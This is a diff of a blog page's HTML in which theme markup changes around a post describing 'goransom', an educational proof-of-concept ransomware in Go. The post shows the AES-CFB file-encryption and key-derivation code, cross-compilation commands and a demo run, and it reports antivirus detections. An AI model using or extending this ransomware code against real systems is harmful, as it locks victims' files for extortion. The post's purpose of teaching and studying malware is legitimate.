+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://linkedin.com/in/andpalmier"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://infosec.exchange/@andpalmier"
+          target="_blank"
+          aria-label="Mastodon"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://andpalmier.com/index.xml"
+          target="_blank"
+          aria-label="Rss"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM128 416c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
 
 </div>
-  </header> 
-  <div class="post-content"><figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/thief_gopher.jpg#center"
-         alt="goransom pic"/> 
-</figure>
+  </div>
+</div>
 
-<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
-<p>This is a blog post about my last project: <a href="https://github.com/andpalmier/goransom" target="_blank" rel="noopener">goransom</a>, which is a proof of concept for a simple ransowmare written in Go. The purpose of the project is purely educative; I wanted to get a bit more familiar with the language and its patterns.</p>
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#technical-details">Technical details</a>
+      <ul>
+        <li><a href="#key-generation-encryption-and-decryption">Key generation, encryption and decryption</a></li>
+        <li><a href="#compile-for-multiple-architectures">Compile for multiple architectures</a></li>
+      </ul>
+    </li>
+    <li><a href="#a-first-run">A first run</a></li>
+    <li><a href="#detection">Detection</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#technical-details">Technical details</a>
+      <ul>
+        <li><a href="#key-generation-encryption-and-decryption">Key generation, encryption and decryption</a></li>
+        <li><a href="#compile-for-multiple-architectures">Compile for multiple architectures</a></li>
+      </ul>
+    </li>
+    <li><a href="#a-first-run">A first run</a></li>
+    <li><a href="#detection">Detection</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = decodeURIComponent(e.attr('id'));
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h2 class="relative group">Introduction 
+    <div id="introduction" class="anchor"></div>
+    
+</h2>
+<p>This is a blog post about my last project:</p>
+<a id="github-07c9cbd23d95ee828b302c9814b8eb97" target="_blank" href="https://github.com/andpalmier/goransom" class="cursor-pointer">
+  <div
+    class="w-full md:w-auto pt-3 p-5 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl">
+
+    <div class="flex items-center">
+      <span class="text-2xl text-neutral-800 dark:text-neutral" style="margin-right:10px;">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+      </span>
+      <div
+        id="github-07c9cbd23d95ee828b302c9814b8eb97-full_name"
+        class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral">
+        andpalmier/goransom
+      </div>
+    </div>
+
+    <p id="github-07c9cbd23d95ee828b302c9814b8eb97-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral">
+      A proof of concept of a super simple ransomware written in Go
+    </p>
+
+    <div class="m-0 mt-2 flex items-center">
+
+      <span class="mr-1 inline-block h-3 w-3 rounded-full"
+        style="background-color: #00ADD8"></span>
+      <div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">
+         Go 
+      </div>
+
+      <span class="text-md mr-1 text-neutral-800 dark:text-neutral">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/></svg>
+  </span>
+
+
+      </span>
+      <div id="github-07c9cbd23d95ee828b302c9814b8eb97-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">
+        8
+      </div>
+
+      <span class="text-md mr-1 text-neutral-800 dark:text-neutral">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/></svg>
+  </span>
+
+
+      </span>
+      <div id="github-07c9cbd23d95ee828b302c9814b8eb97-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">
+        4
+      </div>
+
+    </div>
+
+  </div>
+  <script>
+    fetch("https://api.github.com/repos/andpalmier/goransom", {
+      headers: new Headers({
+        'User-agent': 'Mozilla/4.0 Custom User Agent'
+      })
+    })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('github-07c9cbd23d95ee828b302c9814b8eb97-full_name').innerHTML = data.full_name;
+        document.getElementById('github-07c9cbd23d95ee828b302c9814b8eb97-description').innerHTML = data.description;
+        document.getElementById('github-07c9cbd23d95ee828b302c9814b8eb97-stargazers').innerHTML = data.stargazers_count;
+        document.getElementById('github-07c9cbd23d95ee828b302c9814b8eb97-forks').innerHTML = data.forks;
+      })
+      .catch(error => console.error(error))
+  </script>
+</a>
+<p>which is a proof of concept for a simple ransowmare written in Go. The purpose of the project is purely educative; I wanted to get a bit more familiar with the language and its patterns.</p>
 <p>I am not responsible for the use you make of this tool. <strong>Do not use it on systems where you don&rsquo;t have the permission of the owner</strong>.</p>
-<h2 id="background">Background<a hidden class="anchor" aria-hidden="true" href="#background">#</a></h2>
-<p>Ransomware is a particular type of malware which encrypts the victim&rsquo;s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack" target="_blank" rel="noopener">WannaCry</a>, <a href="https://en.wikipedia.org/wiki/CryptoLocker" target="_blank" rel="noopener">CryptoLocker</a> and <a href="https://en.wikipedia.org/wiki/Locky" target="_blank" rel="noopener">Locky</a>.</p>
+
+
+<h2 class="relative group">Background 
+    <div id="background" class="anchor"></div>
+    
+</h2>
+<p>Ransomware is a particular type of malware which encrypts the victim&rsquo;s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack" target="_blank">WannaCry</a>, <a href="https://en.wikipedia.org/wiki/CryptoLocker" target="_blank">CryptoLocker</a> and <a href="https://en.wikipedia.org/wiki/Locky" target="_blank">Locky</a>.</p>
 <p>While developing an actual ransomware is far from being an easy task, I decided to create a proof of concept with Go to have fun and learn something new.</p>
 <p>Go makes it easy to write malware for different reasons. Firstly, it works nearly everywhere: thanks to cross-compilation, we can write code in Go and use it to obtain an executable for all the most common architectures. Go also has a strong community, with a lot of libraries available. Lastly, it is quite easy to learn and to read, which allows malware programmers to re-engineer the code without too many hassles in case the executable gets detected by anti-viruses.</p>
-<h2 id="technical-details">Technical details<a hidden class="anchor" aria-hidden="true" href="#technical-details">#</a></h2>
+
+
+<h2 class="relative group">Technical details 
+    <div id="technical-details" class="anchor"></div>
+    
+</h2>
 <p>Being a proof of concept, <code>goransom</code> won&rsquo;t automatically start to encrypt the full hard drive. We don&rsquo;t want to cause trouble here.</p>
 <p>Instead, the program allows to specify in input the path of the target file or folder to encrypt. <code>goransom</code> also requires a secret string to be provided, this is going to be used to derive the key for encrypting the files.</p>
 <p>After the files are successfully encrypted, they will have a <em>.locked</em> suffix in the filename. In order to get the original files back, the <code>-decrypt</code> flag can be used, specifying the target files we want to decrypt and the secret which was used for the encryption.</p>
-<h3 id="key-generation-encryption-and-decryption">Key generation, encryption and decryption<a hidden class="anchor" aria-hidden="true" href="#key-generation-encryption-and-decryption">#</a></h3>
-<p><code>goransom</code> encrypts and decrypts the given files using <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">AES block cipher</a>, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the <a href="https://golang.org/pkg/crypto/" target="_blank" rel="noopener">crypto package and its subdirectories</a>.</p>
-<figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/aescfb.png#center"
-         alt="CFB picture"/> <figcaption>
-            <p>Go makes THIS super easy! <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_%28CFB%29" target="_blank" rel="noopener">Pic from Wikipedia</a></p>
-        </figcaption>
-</figure>
 
+
+<h3 class="relative group">Key generation, encryption and decryption 
+    <div id="key-generation-encryption-and-decryption" class="anchor"></div>
+    
+</h3>
+<p><code>goransom</code> encrypts and decrypts the given files using <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank">AES block cipher</a>, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the <a href="https://golang.org/pkg/crypto/" target="_blank">crypto package and its subdirectories</a>.</p>
+
+<figure>
+      <img class="my-0 rounded-md" src="/images/posts/goransom/aescfb.png" alt="CFB picture" />
+  <figcaption>Go makes THIS super easy! <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_%28CFB%29" target="_blank">Pic from Wikipedia</a></figcaption>
+  
+  </figure>
 <p>Since AES allows three different key lengths: 128, 192 and 256, I decided to go for the 256-bits key, which can be obtained from a sha256 hash of the secret string given in input. Here is how the key derivation function looks like:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// given a secret returns the sha256 hash
 </span></span></span><span class="line"><span class="cl"><span class="c1">// used for encryption/decryption
@@ -214,7 +902,7 @@
 </span></span><span class="line"><span class="cl"><span class="c1">// write the ciphertext in the file
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ioutil</span><span class="p">.</span><span class="nf">WriteFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span><span class="nx">ciphertext</span><span class="p">,</span><span class="mo">0644</span><span class="p">)</span>
 </span></span></code></pre></div><p>A <em>&quot;.locked&quot;</em> suffix is then appended to the filename.</p>
-<p>The decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly form the <a href="https://golang.org/pkg/crypto/cipher/" target="_blank" rel="noopener">documentation of the <em>crypto/cipher</em> package</a>.</p>
+<p>The decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly form the <a href="https://golang.org/pkg/crypto/cipher/" target="_blank">documentation of the <em>crypto/cipher</em> package</a>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// open the given file
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ciphertext</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
@@ -243,7 +931,12 @@
 </span></span><span class="line"><span class="cl"><span class="c1">// write the plaintext in the file
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ioutil</span><span class="p">.</span><span class="nf">WriteFile</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span><span class="nx">ciphertext</span><span class="p">,</span><span class="mo">0644</span><span class="p">)</span>
 </span></span></code></pre></div><p>After the decryption, the <em>.locked</em> suffix is removed from the filename, which - if the decryption worked correctly - should now contain the original file.</p>
-<h3 id="compile-for-multiple-architectures">Compile for multiple architectures<a hidden class="anchor" aria-hidden="true" href="#compile-for-multiple-architectures">#</a></h3>
+
+
+<h3 class="relative group">Compile for multiple architectures 
+    <div id="compile-for-multiple-architectures" class="anchor"></div>
+    
+</h3>
 <p>I already mentioned how useful the cross-compilation is, but examples were not provided, so here they are.</p>
 <p>Assuming we have our copy of <code>goransom</code>, if we want to build it for our architecture and OS, it is enough to use:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ go build goransom.go
@@ -259,7 +952,12 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nv">GOOS</span><span class="o">=</span>darwin <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build ransom.go
 </span></span><span class="line"><span class="cl">$ file goransom
 </span></span><span class="line"><span class="cl">goransom: Mach-O 64-bit x86_64 executable
-</span></span></code></pre></div><h2 id="a-first-run">A first run<a hidden class="anchor" aria-hidden="true" href="#a-first-run">#</a></h2>
+</span></span></code></pre></div>
+
+<h2 class="relative group">A first run 
+    <div id="a-first-run" class="anchor"></div>
+    
+</h2>
 <p>This section provides just an example of how to run <code>goransom</code> on Linux. Assuming we have the following structure:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ tree
 </span></span><span class="line"><span class="cl">.
@@ -298,66 +996,299 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">$ cat folder/textfile
 </span></span><span class="line"><span class="cl">THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME
-</span></span></code></pre></div><figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/goransompowershell.png#center"
-         alt="Windows 10 test"/> <figcaption>
-            <p>It works in the same way in Windows 10</p>
-        </figcaption>
-</figure>
+</span></span></code></pre></div>
+<figure>
+      <img class="my-0 rounded-md" src="/images/posts/goransom/goransompowershell.png" alt="Windows 10 test" />
+  <figcaption>It works in the same way in Windows 10</figcaption>
+  
+  </figure>
 
-<h2 id="detection">Detection<a hidden class="anchor" aria-hidden="true" href="#detection">#</a></h2>
+
+<h2 class="relative group">Detection 
+    <div id="detection" class="anchor"></div>
+    
+</h2>
 <p>While I was testing <code>goransom</code> on Windows 10, I had the issue that Windows Security complained about it:</p>
-<figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/windows_def.png#center"
-         alt="Windows Security detects goransom"/> <figcaption>
-            <p>Windows Security doesn&rsquo;t like goransom</p>
-        </figcaption>
-</figure>
 
+<figure>
+      <img class="my-0 rounded-md" src="/images/posts/goransom/windows_def.png" alt="Windows Security detects goransom" />
+  <figcaption>Windows Security doesn&rsquo;t like <code>goransom</code></figcaption>
+  
+  </figure>
 <p>So I uploaded three different <code>goransom</code> executables on VirusTotal, to see if they are detected. Here are the results:</p>
-<figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/vtwin.png#center"
-         alt="VirusTotal detecting goransom"/> <figcaption>
-            <p><a href="https://www.virustotal.com/gui/file/1ea7f882ffab3e6fd7e80ae525df7bb35f53187948647bde2bb87a473e7c0107/detection" target="_blank" rel="noopener">goransom for Windows on VirusTotal</a></p>
-        </figcaption>
-</figure>
 
-<figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/vtlinux.png#center"
-         alt="VirusTotal detecting goransom"/> <figcaption>
-            <p><a href="https://www.virustotal.com/gui/file/982cedf944165137afdf5ec1b6341e588c7bea2c7b84b32578ae522b6784d01b/detection" target="_blank" rel="noopener">goransom for Linux on VirusTotal</a></p>
-        </figcaption>
-</figure>
+<figure>
+      <img class="my-0 rounded-md" src="/images/posts/goransom/vtwin.png" alt="VirusTotal detecting goransom" />
+  <figcaption><a href="https://www.virustotal.com/gui/file/1ea7f882ffab3e6fd7e80ae525df7bb35f53187948647bde2bb87a473e7c0107/detection" target="_blank">goransom for Windows on VirusTotal</a></figcaption>
+  
+  </figure>
 
-<figure class="align-center ">
-    <img loading="lazy" src="/images/posts/goransom/vtmac.png#center"
-         alt="VirusTotal detecting goransom"/> <figcaption>
-            <p><a href="https://www.virustotal.com/gui/file/17c6001d777259d10010622e722c52c36315986895dfab385db0e2f9ddc3a041/detection" target="_blank" rel="noopener">goransom for macOs on VirusTotal</a></p>
-        </figcaption>
-</figure>
+<figure>
+      <img class="my-0 rounded-md" src="/images/posts/goransom/vtlinux.png" alt="VirusTotal detecting goransom" />
+  <figcaption><a href="https://www.virustotal.com/gui/file/982cedf944165137afdf5ec1b6341e588c7bea2c7b84b32578ae522b6784d01b/detection" target="_blank">goransom for Linux on VirusTotal</a></figcaption>
+  
+  </figure>
 
+<figure>
+      <img class="my-0 rounded-md" src="/images/posts/goransom/vtmac.png" alt="VirusTotal detecting goransom" />
+  <figcaption><a href="https://www.virustotal.com/gui/file/17c6001d777259d10010622e722c52c36315986895dfab385db0e2f9ddc3a041/detection" target="_blank">goransom for macOs on VirusTotal</a></figcaption>
+  
+  </figure>
